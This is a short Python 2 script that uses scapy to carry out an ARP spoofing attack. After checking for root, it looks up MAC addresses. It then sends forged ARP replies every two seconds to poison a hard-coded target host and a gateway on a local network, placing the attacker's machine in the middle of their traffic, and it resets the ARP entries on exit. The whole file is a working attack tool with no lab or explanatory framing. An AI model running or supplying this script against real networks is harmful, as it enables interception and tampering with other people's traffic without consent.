def sudo_check():
    import os,sys
    if os.getuid() != 0 :
        print("please run on root privilage")
        sys.exit()
    elif sys.version[0] != '2':
        print("please run this file using python 2")
        sys.exit()

sudo_check()


import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_msg = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_msg
    avalable_device=scapy.srp(arp_broadcast,timeout=2, verbose=False) [0]
    return avalable_device[0][1].hwsrc


def spoofing(tr_ip,accpoint_ip):

    trg_mac= get_mac(tr_ip)
    packet = scapy.ARP(op=2,pdst=tr_ip,hwdst=trg_mac,psrc=accpoint_ip)
    scapy.send(packet, verbose=False)
    # scapy.ls(packet)

def reset(target_ip,spoofer_ip):
    target_mac=get_mac(target_ip)
    spoofer_mac=get_mac(spoofer_ip)
    packet= scapy.ARP(op=2 , pdst=target_ip , hwdst=target_mac , psrc=spoofer_ip,hwsrc=spoofer_mac)
    scapy.send(packet, verbose=False )


dest_ip='192.168.43.32'
spoof_ip='192.168.43.1'
packet_count=0
spoofing(dest_ip, spoof_ip)
try:
    
    while True:

            spoofing(spoof_ip,dest_ip )
            spoofing(dest_ip, spoof_ip)
            packet_count=packet_count+2
            print('\r'+"[+] send packet = "+str(packet_count)),
            sys.stdout.flush()

            time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Program close ..... Quitting ")
    reset(dest_ip,spoof_ip)
    reset(dest_ip, spoof_ip)
except IndexError:
    print("\n[!] please check your internet connection")
    reset(dest_ip, spoof_ip)

# spoofing('192.168.43.32', '192.168.43.1')
# spoofing('192.168.43.1', '192.168.43.32')
